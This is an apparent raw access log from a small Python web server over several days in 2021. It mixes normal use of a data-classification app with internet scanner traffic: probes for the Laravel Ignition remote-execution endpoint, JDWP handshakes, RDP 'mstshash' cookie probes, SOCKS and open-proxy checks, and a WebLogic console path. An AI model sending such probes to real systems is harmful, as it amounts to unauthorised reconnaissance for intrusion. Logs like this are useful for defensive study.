185.20.226.243 - - [29/May/2021 23:26:26] "[33mGET / HTTP/1.0[0m" 404 -
47.241.193.60 - - [30/May/2021 01:46:03] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [30/May/2021 01:46:03] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [30/May/2021 01:46:22] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [30/May/2021 01:46:45] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [30/May/2021 01:46:45] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
154.197.27.231 - - [30/May/2021 05:07:35] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
47.241.193.60 - - [30/May/2021 08:15:06] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [30/May/2021 08:15:43] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [30/May/2021 08:15:43] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
223.166.74.231 - - [30/May/2021 08:15:47] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
223.166.74.231 - - [30/May/2021 08:15:47] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [30/May/2021 08:15:58] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [30/May/2021 08:15:58] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
172.81.129.98 - - [30/May/2021 10:29:54] code 400, message Bad request syntax ('JDWP-Handshake\\0\\0\\0\\11\\0\\0\\0\\1\\0\\1\\1')
172.81.129.98 - - [30/May/2021 10:29:54] "[35m[1mJDWP-Handshake\0\0\0\11\0\0\0\1\0\1\1[0m" HTTPStatus.BAD_REQUEST -
104.219.232.118 - - [30/May/2021 10:29:54] code 400, message Bad request syntax ('JDWP-Handshake\\0\\0\\0\\11\\0\\0\\0\\1\\0\\1\\1')
104.219.232.118 - - [30/May/2021 10:29:54] "[35m[1mJDWP-Handshake\0\0\0\11\0\0\0\1\0\1\1[0m" HTTPStatus.BAD_REQUEST -
203.159.80.75 - - [30/May/2021 10:40:36] code 400, message Bad HTTP/0.9 request type ('ZÂ¥\x01')
203.159.80.75 - - [30/May/2021 10:40:36] "[35m[1mZÂ¥     [0m" HTTPStatus.BAD_REQUEST -
89.248.164.165 - - [30/May/2021 11:35:51] "[33mGET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1[0m" 404 -
60.191.125.35 - - [30/May/2021 11:43:28] "[33mHEAD http://112.124.42.80:63435/ HTTP/1.1[0m" 404 -
119.3.154.26 - - [30/May/2021 12:44:30] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
218.197.97.60 - - [30/May/2021 14:42:06] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:06] "[37mPOST /login HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:16] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:19] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:19] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:52] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:53] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
180.149.125.175 - - [30/May/2021 14:54:24] "[33mGET /c/ HTTP/1.1[0m" 404 -
45.55.83.48 - - [30/May/2021 20:43:12] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
180.149.125.175 - - [31/May/2021 01:03:13] "[33mGET / HTTP/1.1[0m" 404 -
184.105.247.194 - - [31/May/2021 01:50:46] "[33mGET / HTTP/1.1[0m" 404 -
192.111.134.203 - - [31/May/2021 05:36:26] code 400, message Bad request syntax ('\x00\x00\x00Ã Z\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x05\x01=K\x00\x00\x01\x01n\x01\x06')
192.111.134.203 - - [31/May/2021 05:36:26] "[35m[1m   Ã Z          =K  n[0m" HTTPStatus.BAD_REQUEST -
209.141.46.116 - - [31/May/2021 08:31:34] "[33mGET /console/login/LoginForm.jsp HTTP/1.1[0m" 404 -
185.216.140.35 - - [31/May/2021 08:49:42] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
185.216.140.35 - - [31/May/2021 08:49:42] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
118.126.124.172 - - [31/May/2021 11:21:11] "[33mGET / HTTP/1.1[0m" 404 -
161.189.192.94 - - [31/May/2021 12:06:36] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.192.94 - - [31/May/2021 12:06:36] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
167.248.133.40 - - [31/May/2021 15:41:31] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.40 - - [31/May/2021 15:41:32] "[33mGET / HTTP/1.1[0m" 404 -
35.194.76.71 - - [31/May/2021 18:21:01] "[33mGET / HTTP/1.1[0m" 404 -
35.194.76.71 - - [31/May/2021 18:21:02] code 400, message Bad request syntax ("\x16\x03\x01\x01N\x01\x00\x01J\x03\x03\x91^\r(_Ã¤Ã¿\x82B(kÂ¦.\x1b\x11=edÃÃ½'#ÃÃ¹\x04\x85w~\x1cÃ¸4\x93 \x8aÃÂªÃ\x0e:Â¯g\xadÃ4Ã@\x926Â¢xYs\x8eX^\\\x8aÂ¢Â°5\x7f\x9d\x8a.Ã\x00v\x13\x02\x13\x03\x13\x01Ã/Ã+Ã0Ã,\x00\x9eÃ'\x00gÃ(\x00k\x00Â£\x00\x9fÃÂ©ÃÂ¨ÃÂªÃÂ¯Ã\xadÃÂ£Ã\x9fÃ]ÃaÃWÃS\x00Â¢ÃÂ®ÃÂ¬ÃÂ¢Ã\x9eÃ\\Ã`ÃVÃRÃ$\x00jÃ#\x00@Ã")
35.194.76.71 - - [31/May/2021 18:21:02] "[35m[1mN JÂ^(_Ã¤Ã¿ÂB(kÂ¦.=edÃÃ½'#ÃÃ¹Âw~Ã¸4Â ÂÃÂªÃ:Â¯gÂ­Ã4Ã@Â6Â¢xYsÂX^\ÂÂ¢Â°5ÂÂ.Ã vÃ/Ã+Ã0Ã, ÂÃ' gÃ( k Â£ ÂÃÂ©ÃÂ¨ÃÂªÃÂ¯ÃÂ­ÃÂ£ÃÂÃ]ÃaÃWÃS Â¢ÃÂ®ÃÂ¬ÃÂ¢ÃÂÃ\Ã`ÃVÃRÃ$ jÃ# @Ã[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [31/May/2021 20:03:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [31/May/2021 20:03:47] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
64.62.197.92 - - [31/May/2021 20:22:42] "[33mGET / HTTP/1.1[0m" 404 -
122.228.19.80 - - [31/May/2021 22:28:27] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0bÂ¨Ã\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
122.228.19.80 - - [31/May/2021 22:28:27] "[35m[1m   TZ          0I    ÂÂ¨Ã )t F tsXrcsXYs9                      bbXcsXctst      [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [31/May/2021 22:42:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [31/May/2021 22:42:49] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [31/May/2021 23:08:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [31/May/2021 23:08:11] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [01/Jun/2021 01:55:05] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [01/Jun/2021 01:55:30] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [01/Jun/2021 01:55:30] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [01/Jun/2021 01:55:34] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [01/Jun/2021 01:55:34] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [01/Jun/2021 01:55:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 01:55:58] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
142.93.153.150 - - [01/Jun/2021 04:23:05] "[33mGET / HTTP/1.0[0m" 404 -
162.142.125.37 - - [01/Jun/2021 06:56:13] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.37 - - [01/Jun/2021 06:56:13] "[33mGET / HTTP/1.1[0m" 404 -
170.130.187.14 - - [01/Jun/2021 10:38:34] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [01/Jun/2021 10:42:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 10:42:42] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [01/Jun/2021 12:27:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 12:27:18] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
113.57.237.25 - - [01/Jun/2021 13:09:09] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:09] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:11] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:14] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:21] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:26] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:27] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:31] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:31] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:09:43] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:11:57] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:11:57] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:00] "[37mOPTIONS /userInform HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:00] "[37mPOST /userInform HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:03] "[37mOPTIONS /consoleLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:03] "[37mPOST /consoleLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:09] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:13] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:15] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:15] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:18] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:12:19] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:50] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:55] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:57] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:13:57] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:14:13] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:14:13] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:11] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:11] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
74.120.14.53 - - [01/Jun/2021 13:22:12] "[33mGET / HTTP/1.1[0m" 404 -
113.57.237.25 - - [01/Jun/2021 13:22:12] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
74.120.14.53 - - [01/Jun/2021 13:22:12] "[33mGET / HTTP/1.1[0m" 404 -
113.57.237.25 - - [01/Jun/2021 13:22:16] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:17] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:17] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:18] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.237.25 - - [01/Jun/2021 13:22:19] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
45.155.205.209 - - [01/Jun/2021 14:07:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [01/Jun/2021 14:07:46] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.220.205.196 - - [01/Jun/2021 15:43:13] code 400, message Bad request syntax ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03Â¸Ãs\x991\x13Ã K\\)ÃnÂ½Â¼_NÃ\rÂ§l\x06^0/\x0eÃÂ¡Ã¤sÂ·{\x00\x00\x1aÃ/Ã+Ã\x11Ã\x07Ã\x13Ã\tÃ\x14Ã')
185.220.205.196 - - [01/Jun/2021 15:43:13] "[35m[1m u  qÂ¸ÃsÂ1Ã K\)ÃnÂ½Â¼_NÃÂ§l^0/ÃÂ¡Ã¤sÂ·{  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
106.75.136.67 - - [01/Jun/2021 18:01:05] "[33mGET / HTTP/1.0[0m" 404 -
106.75.136.67 - - [01/Jun/2021 18:01:05] "[33mGET / HTTP/1.0[0m" 404 -
106.75.172.167 - - [01/Jun/2021 18:01:48] "[33mGET / HTTP/1.1[0m" 404 -
47.241.193.60 - - [01/Jun/2021 18:12:21] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [01/Jun/2021 18:12:21] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [01/Jun/2021 18:12:49] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [01/Jun/2021 18:13:27] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [01/Jun/2021 18:13:27] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
117.73.9.5 - - [01/Jun/2021 18:14:18] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
117.73.9.5 - - [01/Jun/2021 18:14:18] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
123.14.253.33 - - [01/Jun/2021 18:17:55] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
123.14.253.33 - - [01/Jun/2021 18:17:55] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [01/Jun/2021 18:40:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [01/Jun/2021 18:40:21] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 00:08:37] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 00:08:37] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [02/Jun/2021 03:20:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [02/Jun/2021 03:20:58] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
162.142.125.128 - - [02/Jun/2021 04:05:43] "[33mGET / HTTP/1.1[0m" 404 -
161.189.134.11 - - [02/Jun/2021 05:07:28] code 400, message Bad request syntax ('{\x01\x00\x1615888888888ÃÂ¨\x90Ã\x13\x8a{')
161.189.134.11 - - [02/Jun/2021 05:07:28] "[35m[1m{ 15888888888ÃÂ¨ÂÃÂ{[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:13:01] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.192.94 - - [02/Jun/2021 05:13:01] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [02/Jun/2021 05:14:15] code 400, message Bad request syntax ('&&&&~\x04Â»8ÃaÃ½T\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [02/Jun/2021 05:14:15] "[35m[1m&&&&~Â»8ÃaÃ½TP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:22:35] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.192.94 - - [02/Jun/2021 05:22:35] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [02/Jun/2021 05:29:14] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03Â¥-~')
161.189.134.11 - - [02/Jun/2021 05:29:14] "[35m[1m~   ÂÂÂÂÂÂ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:31:22] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.192.94 - - [02/Jun/2021 05:31:22] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:37:57] code 400, message Bad HTTP/0.9 request type ('\x02Â¤UÃ¿\x00\x00\x00')
161.189.192.94 - - [02/Jun/2021 05:37:57] "[35m[1mÂ¤UÃ¿   [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [02/Jun/2021 05:39:31] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÃ')
161.189.134.11 - - [02/Jun/2021 05:39:31] "[35m[1m~~ 4Vx4/  YQkÃ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [02/Jun/2021 05:44:59] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [02/Jun/2021 05:44:59] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
8.129.111.49 - - [02/Jun/2021 06:06:06] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [02/Jun/2021 08:03:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 08:03:13] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
184.105.139.69 - - [02/Jun/2021 08:08:19] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.40 - - [02/Jun/2021 08:47:46] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.40 - - [02/Jun/2021 08:47:46] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [02/Jun/2021 11:49:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 11:49:12] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 13:11:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 13:11:57] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 14:37:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 14:37:07] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [02/Jun/2021 15:24:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [02/Jun/2021 15:24:19] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
113.57.176.189 - - [02/Jun/2021 15:28:26] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:26] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:30] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:31] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:31] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:33] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:34] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
113.57.176.189 - - [02/Jun/2021 15:28:35] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
193.106.29.74 - - [02/Jun/2021 16:43:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [02/Jun/2021 16:43:16] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
113.57.237.10 - - [02/Jun/2021 21:18:18] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:18] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:22] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:25] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:25] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.10 - - [02/Jun/2021 21:18:35] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
89.248.165.107 - - [02/Jun/2021 21:21:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:21:33] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 21:40:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:40:29] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.103 - - [02/Jun/2021 21:40:36] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
89.248.165.103 - - [02/Jun/2021 21:40:36] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 21:47:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:47:32] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 21:56:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 21:56:25] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [02/Jun/2021 22:03:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [02/Jun/2021 22:03:16] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [02/Jun/2021 23:41:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [02/Jun/2021 23:41:44] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 01:50:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 01:50:26] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
167.248.133.56 - - [03/Jun/2021 02:17:55] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.56 - - [03/Jun/2021 02:17:55] "[33mGET / HTTP/1.1[0m" 404 -
